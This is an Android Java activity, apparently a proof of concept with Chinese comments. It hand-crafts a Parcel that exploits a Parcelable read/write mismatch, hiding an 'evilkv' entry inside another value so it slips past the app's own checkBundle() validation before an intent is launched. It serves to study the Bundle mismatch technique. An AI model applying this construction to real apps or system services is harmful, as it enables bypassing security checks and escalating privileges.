package com.egguncle.mismatchparcel.ui;

import android.content.Intent;
import android.os.Bundle;
import android.os.Parcel;
import android.support.v7.app.AppCompatActivity;
import android.util.Log;
import android.view.View;

import com.egguncle.mismatchparcel.R;
import com.egguncle.mismatchparcel.util.MyFileUtil;


public class MainActivity extends AppCompatActivity {

    private final static String TAG = "MYTEST1";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);


        findViewById(R.id.btn_1).setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                Parcel parcel = Parcel.obtain();
                String evilData = "evil data";
                //键值对的数量
                parcel.writeInt(3);
                //parcel.writeInt(1);
                //第一个键
                //第一个键的内容
                parcel.writeString("mytest");
                //值的类型 4 代表序列化对象
                parcel.writeInt(4);
                //对应的类
                parcel.writeString("com.egguncle.mismatchparcelable.data.MyMismatchParcel");
                //写入数据
                parcel.writeInt(123);

//                //这是正常情况,但是我们现在利用不匹配的问题,在它前面构造一个kv再将其藏在里面
//                //第二个键
//                //第二个键的内容
//                parcel.writeString("evilkv");
//                //值的类型
//                parcel.writeInt(4);
//                //对应的类
//                parcel.writeString("com.egguncle.mismatchparcelable.data.EvilParcel");
//                //写入数据
//                parcel.writeString(evilData);

           //         第二个键的键值长度
                parcel.writeInt(1);
                //    parcel.writeInt(0);
                //      第二个键的键值
                parcel.writeInt(6);
                //parcel.writeInt(6);
                //parcel.writeLong(13);
                parcel.writeInt(13);

                //占个坑,一会儿回来给它写上咱们evil kv的
                parcel.writeInt(-1);

                int keyIntentStartPos = parcel.dataPosition();
                parcel.writeString("evilkv");
                //值的类型
                parcel.writeInt(4);
                //对应的类
                parcel.writeString("com.egguncle.mismatchparcelable.data.EvilParcel");
                //写入数据
                parcel.writeString(evilData);

                int keyIntentEndPos = parcel.dataPosition();
                int lengthOfKeyIntent = keyIntentEndPos - keyIntentStartPos;
                parcel.setDataPosition(keyIntentStartPos - 4);  // backpatch length of evilkv
                parcel.writeInt(lengthOfKeyIntent);
                parcel.setDataPosition(keyIntentEndPos);


                //因为最后恶意kv被取出来以后,,bundle实际上就有了三个kv(在不算最后这一个的情况下)
                // 第三个kv就是我们的恶意kv,而bundle的数量只能大不能小不然就读不到第三个了
                parcel.writeString("Padding-Key");
                parcel.writeInt(0); // VAL_STRING
                parcel.writeString("Padding-Value"); //

                Parcel targetParcel = Parcel.obtain();
                int length = parcel.dataSize();
                targetParcel.writeInt(length);
                targetParcel.writeInt(0x4c444E42);
                targetParcel.appendFrom(parcel, 0, length);
                targetParcel.setDataPosition(0);

                Bundle bundle = new Bundle();
                bundle.setClassLoader(getClass().getClassLoader());
                bundle.readFromParcel(targetParcel);

                MyFileUtil.dumpBundle(targetParcel, "test1");


//                Bundle testBundle=new Bundle();
//                EvilParcel evilParcel=new EvilParcel("evil data");
//                testBundle.putParcelable("evilkv",evilParcel);
                if (checkBundle(bundle)){
                    Intent intent = new Intent(MainActivity.this, Main2Activity.class);
                    intent.putExtras(bundle);
                    startActivity(intent);
                }else{
                    Log.i(TAG, "there is a evilkv!");
                }
                

            }
        });
    }

    private boolean checkBundle(Bundle bundle) {
        if (bundle.getParcelable("evilkv") != null) {
            return false;
        }
        return true;
    }
}
